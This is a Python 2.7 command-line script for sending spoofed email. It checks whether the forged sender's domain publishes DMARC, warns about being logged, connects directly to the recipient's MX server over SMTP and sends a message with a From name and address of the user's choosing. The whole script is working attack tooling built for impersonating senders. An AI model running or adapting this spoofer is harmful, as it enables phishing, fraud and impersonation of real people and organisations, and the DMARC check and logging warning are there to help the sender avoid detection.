#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import dns.resolver
import socket
from socket import gethostbyname, gaierror
import sys
import argparse
import ssl

parser = argparse.ArgumentParser()
parser.add_argument("-tls", help="Add this option if you want to connect to the MX using STARTTLS",
        action="store_true")
args = parser.parse_args()


def reading(socket):
        rec = socket.recv(512)
        print("[REMOTE]: "+rec)
        return rec

def writing(socket,data):
        if args.tls and "RCPT" in data:
            data = "rcpt to:" + data.split(":")[1]
            data = data.lower()
        socket.send(data+'\r\n')
        return

def check_code(data,code):
    return data[:3] == code



email_sender = raw_input("[SYSTEM]: Insert the sender of the email message: ")
sender_domain = email_sender.split("@")[-1]
try:
    security_check = list(dns.resolver.query("_dmarc." + sender_domain,"TXT"))
except (dns.resolver.NXDOMAIN,dns.resolver.NoAnswer) as err:
    pass
else:
    print("[WARNING]: The domain you are trying to spoof is using DMRAC secuiry mechanism.\n\
The email will be marked as SPAM and/or rejected.")

    ans = raw_input("[WARNING]: Very likely your sending IP will be logged in a secuiry log if you proceed.\n\
Do you want to continue? (y/n): ")
    while ans.lower() not in ["y","n"]:
        ans = raw_input("Enter 'y' or 'n': ")
    if ans.lower() == "n":
        sys.exit(2)

email_receiver = raw_input("[SYSTEM]: Insert the receiver of the email message: ")
receiver_domain = email_receiver.split("@")[-1]
print("[SYSTEM]: Looking for an availabe MX server belonging to {0}".format(receiver_domain))

answers = dns.resolver.query(receiver_domain, "MX")
for ans in answers:
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(5)

        mx_server = ans.exchange.to_text()[:-1]
        print("[SYSTEM]: Connecting to {0} mail server".format(mx_server))
        sock.connect((mx_server,25))

        rec = reading(sock)
        if not check_code(rec,"220"): continue

        writing(sock,"HELO " + sender_domain)
        rec = reading(sock)
        if not check_code(rec,"250"): continue

        if args.tls:
            writing(sock,"STARTTLS")
            rec = reading(sock)
            if not check_code(rec,"220"):
                print("[ERROR]: STARTTLS not ready")
                continue
            sock = ssl.wrap_socket(sock)
            writing(sock,"HELO " + sender_domain)
            rec = reading(sock)
            if not check_code(rec,"250"): continue

        writing(sock,"MAIL FROM: <{0}>".format(email_sender))
        rec = reading(sock)
        if not check_code(rec,"250"): continue

        writing(sock,"RCPT TO: <{0}>".format(email_receiver))
        rec = reading(sock)
        if not check_code(rec,"250"): continue

        writing(sock,"DATA")
        rec = reading(sock)
        if not check_code(rec,"354"): continue

        name = raw_input("[SYSTEM]: Tell me the name you want to see in the From: field of the email: ")
        writing(sock,"From: {0} <{1}>".format(name,email_sender))
        writing(sock,"To: <{0}>".format(email_receiver))
        subj = raw_input("[SYSTEM]: Enter the subject of the email: ")
        writing(sock,"Subject: {0}".format(subj))
        writing(sock,"Date: +%a, %d %b %Y %H:%M:%S %z".format(subj))

        print("[SYSTEM]: Enter the body of the email, terminate the input with <CRLF>.<CRLF>")
        sentinel = "." # ends when this string is seen
        text = "\r\n".join(iter(raw_input, sentinel))
        text += "\r\n."
        writing(sock,text)

        rec = reading(sock)
        if not check_code(rec,"250"):
            print("[ERROR]: Error in sending email:\n{0}".format(rec))
            sys.exit(3)
        else:
            print("[SYSTEM]: Mail sent")
            sys.exit(0)

    except Exception as err:
        print(err)
        continue

print("[ERROR]: Did not find any MX server available, maybe you entered a wrong email")
sys.exit(4)
